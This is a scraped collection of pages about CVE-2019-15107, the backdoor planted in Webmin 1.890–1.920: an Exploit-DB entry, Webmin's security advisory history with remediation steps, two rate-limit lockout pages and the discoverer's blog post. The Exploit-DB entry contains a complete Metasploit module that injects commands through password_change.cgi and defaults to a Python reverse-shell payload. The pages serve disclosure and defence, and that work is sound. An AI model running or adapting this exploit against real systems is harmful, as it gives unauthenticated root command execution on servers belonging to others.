=== Content from www.exploit-db.com_b5148e2b_20250121_023025.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)

#### EDB-ID:

###### 47230

#### CVE:

###### [2019-15107](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)

---

**EDB Verified:**

#### Author:

###### [AkkuS](/?author=9483)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2019-08-12

---

**Vulnerable App:**

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Webmin 1.920 Unauthenticated RCE',
      'Description'        => %q{
        This module exploits a backdoor in Webmin versions 1.890 through 1.920.
        Only the SourceForge downloads were backdoored, but they are listed as
        official downloads on the project's site.

        Unknown attacker(s) inserted Perl qx statements into the build server's
        source code on two separate occasions: once in April 2018, introducing
        the backdoor in the 1.890 release, and in July 2018, reintroducing the
        backdoor in releases 1.900 through 1.920.

        Only version 1.890 is exploitable in the default install. Later affected
        versions require the expired password changing feature to be enabled.
      },
      'Author'         => [
        'AkkuS <Özkan Mustafa Akkuş>' # Discovery & PoC & Metasploit module @ehakkus
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2019-'],
          ['URL', 'https://www.pentest.com.tr']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'DefaultOptions' =>
        {
          'RPORT' => 10000,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_python'
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Webmin <= 1.910', {}]],
      'DisclosureDate' => 'May 16 2019',
      'DefaultTarget'  => 0)
    )
    register_options [
        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])
    ]
  end

  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end
  ##
  # Target and input verification
  ##
  def check
    # check passwd change priv
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, "password_change.cgi"),
      'headers' =>
        {
          'Referer' => "#{peer}/session_login.cgi"
        },
      'cookie'  => "redirect=1; testing=1; sid=x; sessiontest=1"
    })

    if res && res.code == 200 && res.body =~ /Failed/
      res = send_request_cgi(
        {
        'method' => 'POST',
        'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
        'ctype'  => 'application/x-www-form-urlencoded',
        'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
        'headers' =>
          {
            'Referer' => "#{peer}/session_login.cgi"
          },
        'data' => "user=root&pam=&expired=2&old=AkkuS%7cdir%20&new1=akkuss&new2=akkuss"
        })

      if res && res.code == 200 && res.body =~ /password_change.cgi/
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    else
      return CheckCode::Safe
    end
  end

  ##
  # Exploiting phase
  ##
  def exploit

    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

    command = payload.encoded
    print_status("Attempting to execute the payload...")
    handler
    res = send_request_cgi(
      {
      'method' => 'POST',
      'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
      'ctype'  => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
      'headers' =>
        {
          'Referer' => "#{peer}/session_login.cgi"
        },
      'data' => "user=root&pam=&expired=2&old=AkkuS%7c#{command}%20&new1=akkuss&new2=akkuss"
      })

  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from packetstormsecurity.com_1dc833aa_20250121_002232.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from www.webmin.com_fff90064_20250121_002236.html ===


* [Download](https://webmin.com/download/ "Download")
* [Changelog](https://webmin.com/archives/ "Changelog")
* [FAQ](https://webmin.com/faq/ "FAQ")
* [Documentation](https://webmin.com/docs/ "Documentation")
* [Forum](https://forum.virtualmin.com/c/webmin/12 "Forum")
# Security

April 25, 2024 Â· 12 min Â· Jamie Cameron | [Suggest Changes](https://github.com/webmin/webmin.com/blob/main/content/security.md)

This page lists security problems found in Webmin and Usermin, versions affected and recommended solutions.

 **Found a bug?**
If you info found a new security related bug report it at **security@webmin.com**
### Webmin 2.105 and below [April 15, 2024][#](#webmin-2105-and-below-april-15-2024)

#### Privilege escalation by non-root users [CVE-2024-12828][#](#privilege-escalation-by-non-root-users-cve-2024-12828)

* A less-privileged Webmin user can execute commands as root via a vulnerability in the shell autocomplete feature.
* All Virtualmin admins and Webmin admins who have created additional accounts should upgrade to version 2.111 as soon as possible!

  > Thanks to Trend Microâs Zero Day Initiative for finding and reporting this issue.

### Webmin 1.995 and Usermin 1.850 and below [June 30, 2022][#](#webmin-1995-and-usermin-1850-and-below-june-30-2022)

#### XSS vulnerability in the HTTP Tunnel module[#](#xss-vulnerability-in-the-http-tunnel-module)

* If a less-privileged Webmin user is given permission to edit the configuration of the HTTP Tunnel module, he/she could use this to introduce a vulnerability that captures cookies belonging to other Webmin users that use the module.

  > Thanks to [BLACK MENACE](https://github.com/bl4ckmenace) and [PYBRO](https://github.com/Pybro09) for reporting this issue.
* An HTML email crafted by an attacker could capture browser cookies when opened.

  > Thanks to [ly1g3](https://github.com/ly1g3) for reporting this bug.

### Webmin 1.991 and below [April 18, 2022][#](#webmin-1991-and-below-april-18-2022)

#### Privilege escalation exploit [CVE-2022-30708][#](#privilege-escalation-exploit-cve-2022-30708)

* Less privileged Webmin users (excluding those created by Virtualmin and Cloudmin) can modify arbitrary files with root privileges, and so run commands as root. All systems with additional untrusted Webmin users should upgrade immediately.

  > Thanks to [esp0xdeadbeef](https://github.com/esp0xdeadbeef) and [V1s3r1on](https://github.com/V1s3r1on) for finding and reporting this issue!

### Webmin 1.984 and below [December 26, 2021][#](#webmin-1984-and-below-december-26-2021)

#### File Manager privilege exploit [CVE-2022-0824 and CVE-2022-0829][#](#file-manager-privilege-exploit-cve-2022-0824-and-cve-2022-0829)

* Less privileged Webmin users who do not have any File Manager module restrictions configured can access files with root privileges, if using the default Authentic theme. All systems with additional untrusted Webmin users should upgrade immediately. Note that Virtualmin systems are not effected by this bug, due to the way domain owner Webmin users are configured.

  > Thanks to Faisal Fs ([faisalfs10x](https://github.com/faisalfs10x/)) from [NetbyteSEC](https://www.netbytesec.com/) for finding and reporting this issue!

### Virtualmin Procmail wrapper version 1.0[#](#virtualmin-procmail-wrapper-version-10)

#### Privilege escalation exploit[#](#privilege-escalation-exploit)

* Version 1.0 of the `procmail-wrapper` package installed with Virtualmin has a vulnerability that can be used by anyone with SSH access to gain `root` privileges. To prevent this, all Virtualmin users should upgrade to version 1.1 or later immediately.

### Webmin 1.973 and below [March 7, 2021][#](#webmin-1973-and-below-march-7-2021)

#### XSS vulnerabilities if Webmin is installed using the `setup.pl` script [CVE-2021-31760, CVE-2021-31761 and CVE-2021-31762][#](#xss-vulnerabilities-if-webmin-is-installed-using-the-setuppl-script-cve-2021-31760-cve-2021-31761-and-cve-2021-31762)

* If Webmin is installed using the non-recommended `setup.pl` script, checking for unknown referers is not enabled by default. This opens the system up to XSS and CSRF attacks using malicious links. Fortunately the standard `rpm`, `deb`, `pkg` and `tar` packages do not use this script and so are not vulnerable. If you did install using the `setup.pl` script, the vulnerability can be fixed by adding the line `referers_none=1` to `/etc/webmin/config` file.

> Thanks to Meshal ( Mesh3l\_911 ) [@Mesh3l\_911](https://twitter.com/Mesh3l_911) and Mohammed ( Z0ldyck ) [@electronicbots](https://twitter.com/electronicbots) for finding and reporting this issue!

### Webmin 1.941 and below [January 16, 2020][#](#webmin-1941-and-below-january-16-2020)

#### XSS vulnerability in the Command Shell module [CVE-2020-8820 and CVE-2020-8821][#](#xss-vulnerability-in-the-command-shell-module-cve-2020-8820-and-cve-2020-8821)

* A user with privileges to create custom commands could exploit other users via unescaped HTML.

> Thanks to Mauro Caseres for reporting this and the following issue.

### Webmin 1.941 and below [January 16, 2020][#](#webmin-1941-and-below-january-16-2020-1)

#### XSS vulnerability in the Read Mail module [CVE-2020-12670][#](#xss-vulnerability-in-the-read-mail-module-cve-2020-12670)

* Saving a malicious HTML attachment could trigger and XSS vulnerability.

### Webmin 1.882 to 1.921 [July 6, 2019][#](#webmin-1882-to-1921-july-6-2019)

#### Remote Command Execution [CVE-2019-15231][#](#remote-command-execution-cve-2019-15231)

* Webmin releases between these versions contain a vulnerability that allows remote command execution! Version 1.890 is vulnerable in a default install and should be upgraded immediately - other versions are only vulnerable if changing of expired passwords is enabled, which is not the case by default.

  Either way, upgrading to version 1.930 is strongly recommended. Alternately, if running versions 1.900 to 1.920, edit `/etc/webmin/miniserv.conf`, remove the `passwd_mode=` line, then run `/etc/webmin/restart` command.
  More details..Webmin version 1.890 was released with a backdoor that could allow anyone with knowledge of it to execute commands as root. Versions 1.900 to 1.920 also contained a backdoor using similar code, but it was not exploitable in a default Webmin install. Only if the admin had enabled the feature at **Webmin â¾ Webmin Configuration â¾ Authentication** to allow changing of expired passwords could it be used by an attacker.

  Neither of these were accidental bugs - rather, the Webmin source code had been maliciously modified to add a non-obvious vulnerability. It appears that this happened as follows :

  + At some time in April 2018, the Webmin development build server was exploited and a vulnerability added to the `password_change.cgi` script. Because the timestamp on the file was set back, it did not show up in any Git diffs. This was included in the Webmin 1.890 release.
  + The vulnerable file was reverted to the checked-in version from GitHub, but sometime in July 2018 the file was modified again by the attacker. However, this time the exploit was added to code that is only executed if changing of expired passwords is enabled. This was included in the Webmin 1.900 release.
  + On September 10th 2018, the vulnerable build server was decommissioned and replaced with a newly installed server running CentOS 7. However, the build directory containing the modified file was copied across from backups made on the original server.
  + On August 17th 2019, we were informed that a 0-day exploit that made use of the vulnerability had been released. In response, the exploit code was removed and Webmin version 1.930 created and released to all users.

  In order to prevent similar attacks in future, we’re doing the following :

  + Updating the build process to use only checked-in code from GitHub, rather than a local directory that is kept in sync.
  + Rotated all passwords and keys accessible from the old build system.
  + Auditing all GitHub commits over the past year to look for commits that may have introduced similar vulnerabilities.
### Webmin 1.900 [November 19, 2018][#](#webmin-1900-november-19-2018)

#### Remote Command Execution (Metasploit)[#](#remote-command-execution-metasploit)

* This is *not* a workable exploit as it requires that the attacker already know the root password. Hence there is no fix for it in Webmin.

### Webmin 1.900 and below [November 19, 2018][#](#webmin-1900-and-below-november-19-2018)

#### Malicious HTTP headers in downloaded URLs[#](#malicious-http-headers-in-downloaded-urls)

* If the Upload and Download or File Manager module is used to fetch an un-trusted URL. If a Webmin user downloads a file from a malicious URL, HTTP headers returned can be used exploit an XSS vulnerability.

> Thanks to independent security researcher, John Page aka hyp3rlinx, who reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

### Webmin 1.800 and below [May 26, 2016][#](#webmin-1800-and-below-may-26-2016)

#### Authentic theme configuration page vulnerability[#](#authentic-theme-configuration-page-vulnerability)

* Only an issue if your system has un-trusted users with Webmin access and is using the new Authentic theme. A non-root Webmin user could use the theme configuration page to execute commands as root.

#### Authentic theme remote access vulnerability[#](#authentic-theme-remote-access-vulnerability)

* Only if the Authentic theme is enabled globally. An attacker could execute commands remotely as root, as long as there was no firewall blocking access to Webmin’s port 10000.

### Webmin 1.750 and below [May 12, 2015][#](#webmin-1750-and-below-may-12-2015)

#### XSS (cross-site scripting) vulnerability in `xmlrpc.cgi` script [CVE-2015-1990][#](#xss-cross-site-scripting-vulnerability-in-xmlrpccgi-script-cve-2015-1990)

* A malicious website could create links or JavaScript referencing the `xmlrpc.cgi` script, triggered when a user logged into Webmin visits the attacking site.

> Thanks to Peter Allor from IBM for finding and reporting this issue.

### Webmin 1.720 and below [November 24, 2014][#](#webmin-1720-and-below-november-24-2014)

#### Read Mail module vulnerable to malicious links[#](#read-mail-module-vulnerable-to-malicious-links)

* If un-trusted users have both SSH access and the ability to use Read User Mail module (as is the case for Virtualmin domain owners), a malicious link could be created to allow reading any file on the system, even those owned by *root*.

> Thanks to Patrick William from RACK911 labs for finding this bug.

### Webmin 1.700 and below [August 11, 2014][#](#webmin-1700-and-below-august-11-2014)

#### Shellshock vulnerability[#](#shellshock-vulnerability)

* If your *bash* shell is vulnerable to *shellshock*, it can be exploited by attackers who have a Webmin login to run arbitrary commands as *root*. Updating to version 1.710 (or updating *bash*) will fix this issue.

### Webmin 1.590 and below [June 30, 2012][#](#webmin-1590-and-below-june-30-2012)

#### XSS (cross-site scripting) security hole[#](#xss-cross-site-scripting-security-hole)

* A malicious website could create links or JavaScript referencing the File Manager module that allowed execution of arbitrary commands via Webmin when the website is viewed by the victim. See [CERT vulnerability note VU#788478](http://www.kb.cert.org/vuls/id/788478) for more details. Thanks to Jared Allar from the American Information Security Group for reporting this problem.

#### Referer checks don’t include port[#](#referer-checks-dont-include-port)

* If an attacker has control over `http://example.com/` then he/she could create a page with malicious JavaScript that could take over a Webmin session at `https://example.com:10000/` when `http://example.com/` is viewed by the victim.

> Thanks to Marcin Teodorczyk for finding this issue.

### Webmin 1.540 and below [April 20, 2011][#](#webmin-1540-and-below-april-20-2011)

#### XSS (cross-site scripting) security hole[#](#xss-cross-site-scripting-security-hole-1)

* This vulnerability can be triggered if an attacker changes his Unix username via a tool like `chfn`, and a page listing usernames is then viewed by the root user in Webmin.

> Thanks to Javier Bassi for reporting this bug.

### Virtualmin 3.70 and below [June 23, 2009][#](#virtualmin-370-and-below-june-23-2009)

#### Unsafe file writes in Virtualmin[#](#unsafe-file-writes-in-virtualmin)

* This bug allows a virtual server owner to read or write to arbitrary files on the system by creating malicious symbolic links and then having Virtualmin perform operations on those links. Upgrading to version 3.70 is strongly recommended if your system has un-trusted domain owners.

### Webmin 1.390 and below, Usermin 1.320 and below [February 8, 2008][#](#webmin-1390-and-below-usermin-1320-and-below-february-8-2008)

#### XSS (cross-site scripting) security hole[#](#xss-cross-site-scripting-security-hole-2)

* This attack could open users who visit un-trusted websites while having Webmin open in the same browser up to having their session cookie captured, which could then allow an attacker to login to Webmin without a password. The quick fix is to go to the **Webmin Configuration** module, click on the **Trusted Referers** icon, set **Referrer checking enabled?** to **Yes**, and un-check the box **Trust links from unknown referrers**. Webmin 1.400 and Usermin 1.330 will make these settings the defaults.

### Webmin 1.380 and below [November 3, 2007][#](#webmin-1380-and-below-november-3-2007)

#### Windows-only command execution bug[#](#windows-only-command-execution-bug)

* Any user logged into Webmin can execute any command using special URL parameters. This could be used by less-privileged Webmin users to raise their level of access.

> Thanks for Keigo Yamazaki of Little eArth Corporation for finding this bug.

### Webmin 1.374 and below, Usermin 1.277 and below[#](#webmin-1374-and-below-usermin-1277-and-below)

#### XSS bug in `pam_login.cgi` script[#](#xss-bug-in-pam_logincgi-script)

* A malicious link to Webmin `pam_login.cgi` script can be used to execute JavaScript within the Webmin server context, and perhaps steal session cookies.

### Webmin 1.330 and below, Usermin 1.260 and below[#](#webmin-1330-and-below-usermin-1260-and-below)

#### XSS bug in `chooser.cgi` script[#](#xss-bug-in-choosercgi-script)

* When using Webmin or Usermin to browse files on a system that were created by an attacker, a specially crafted filename could be used to inject arbitrary JavaScript into the browser.

### Webmin 1.296 and below, Usermin 1.226 and below[#](#webmin-1296-and-below-usermin-1226-and-below)

#### Remote source code access[#](#remote-source-code-access)

* An attacker can view the source code of Webmin CGI and Perl programs using a specially crafted URL. Because the source code for Webmin is freely available, this issue should only be of concern to sites that have custom modules for which they want the source to remain hidden.

#### XSS bug[#](#xss-bug)

* The XSS bug makes use of a similar technique to craft a URL that can allow arbitrary JavaScript to be executed in the user’s browser if a malicious link is clicked on.

> Thanks for Keigo Yamazaki of Little eArth Corporation for finding this bug.

### Webmin 1.290 and below, Usermin 1.220 and below[#](#webmin-1290-and-below-usermin-1220-and-below)

#### Arbitrary remote file access[#](#arbitrary-remote-file-access)

* An attacker without a login to Webmin can read the contents of any file on the server using a specially crafted URL. All users should upgrade to version 1.290 as soon as possible, or setup IP access control in Webmin.

> Thanks to Kenny Chen for bringing this to my attention.

### Webmin 1.280 and below[#](#webmin-1280-and-below)

#### Windows arbitrary file access[#](#windows-arbitrary-file-access)

* If running Webmin on Windows, an attacker can remotely view the contents of any file on your system using a specially crafted URL. This does not affect other operating systems, but if you use Webmin on Windows you should upgrade to version 1.280 or later.

> Thanks to Keigo Yamazaki of Little eArth Corporation for discovering this bug.

### Webmin 1.250 and below, Usermin 1.180 and below[#](#webmin-1250-and-below-usermin-1180-and-below)

#### Perl syslog input attack[#](#perl-syslog-input-attack)

* When logging of failing login attempts via `syslog` is enabled, an attacker can crash and possibly take over the Webmin webserver, due to un-checked input being passed to Perl’s `syslog` function. Upgrading to the latest release of Webmin is recommended.

> Thanks to Jack at Dyad Security for reporting this problem to me.

### Webmin 1.220 and below, Usermin 1.150 and below[#](#webmin-1220-and-below-usermin-1150-and-below)

#### Full PAM conversations’ mode remote attack[#](#full-pam-conversations-mode-remote-attack)

* Affects systems when the option **Support full PAM conversations?** is enabled on the **Webmin â¾ Webmin Configuration â¾ Authentication** page. When this option is enabled in Webmin or Usermin, an attacker can gain remote access to Webmin without needing to supply a valid login or password. Fortunately this option is not enabled by default and is rarely used unless you have a PAM setup that requires more than just a username and password, but upgrading is advised anyway.

> Thanks to Keigo Yamazaki of Little eArth Corporation and [JPCERT/CC](http://www.jpcert.or.jp/) for discovering and notifying me of this bug.

### Webmin 1.175 and below, Usermin 1.104 and below[#](#webmin-1175-and-below-usermin-1104-and-below)

#### Brute force password guessing attack[#](#brute-force-password-guessing-attack)

* Prior Webmin and Usermin versions do not have password timeouts turned on by default, so an attacker can try every possible password for the *root* or admin user until he/she finds the correct one.
  The solution is to enable password timeouts, so that repeated attempts to login as the same user will become progressively slower. This can be done by following these steps :

  + Go to the **Webmin Configuration** module.
  + Click on the **Authentication** icon.
  + Select the **Enable password timeouts** button.
  + Click the **Save** button at the bottom of the page.

  This problem is also present in Usermin, and can be prevented by following the same steps in the **Usermin Configuration** module.

### Webmin 1.150 and below, Usermin 1.080 and below[#](#webmin-1150-and-below-usermin-1080-and-below)

#### XSS vulnerability[#](#xss-vulnerability)

* When viewing HTML email, several potentially dangerous types of URLs can be passed through. This can be used to perform malicious actions like executing commands as the logged-in Usermin user.

#### Module configurations are visible[#](#module-configurations-are-visible)

* Even if a Webmin user does not have access to a module, he/she can still view it’s Module Config page by entering a URL that calls `config.cgi` with the module name as a parameter.

#### Account lockout attack[#](#account-lockout-attack)

* By sending a specially constructed password, an attacker can lock out other users if password timeouts are enabled.

© 1997 - 2024 [Webmin](https://webmin.com/about/#developers)

=== Content from packetstormsecurity.com_a005f2ac_20250121_002230.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from www.pentest.com.tr_1b99b92f_20250121_023019.html ===

ââââââ âââ ââââââ ââââââ âââââââââââ
âââââââââââ âââââââ âââââââ âââââââââââ
âââââââââââââââ âââââââ âââ âââââââââââ
âââââââââââââââ âââââââ âââ âââââââââââ
âââ ââââââ ââââââ ââââââââââââââââââââ
âââ ââââââ ââââââ âââ âââââââ ââââââââ
"I know Hack and I believe in Hak. So...You have no chance :/"

* [Root](../index.html)
* [Blog](/blog/)
* [Pentest](/pentest/)
* [Whoami](/whoami/)
* [Exploits](/exploits/)

## EDB-ID: 47230

## CVE-2019-15107

10 Aug, 2019
â¢
EXPLOIT

- This 0day has been published at @DEFCON AppSec Village by me
- Vendor fixed this vulnerability. [Webmin must update to the 1.930 version.](http://webmin.com/changes.html)
- [Exploit-DB Link](https://www.exploit-db.com/exploits/47230)
- [CVE-Mitre Link](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)
- [Download defcon\_webmin\_unauth\_rce.rb (Metasploit)](https://pentest.com.tr/blog/defcon-0days-10102019/defcon_webmin_unauth_rce.rb)
The vulnerability was secretly planted by an unknown hacker who successfully managed to inject a BACKDOOR at some point in its build infrastructure that surprisingly persisted into various releases of Webmin (1.882 through 1.921) and eventually remained hidden for over a year.Developers confirmed that the official Webmin downloads were replaced by the backdoored packages only on the project's SourceForge repository, and not on the Webmin's Github repositories.I have placed the reference links on this situation below.
### References and Explanations

- [Reddit discussions](https://www.reddit.com/r/netsec/comments/crk77z/0day_remote_code_execution_for_webmin/)
- [The first explanation from the developers.](https://www.virtualmin.com/node/66890)
- [The latest explanation from the developers "What Happened?"](http://www.webmin.com/exploit.html)
- [Press News (thehackernews)](https://thehackernews.com/2019/08/webmin-vulnerability-hacking.html)
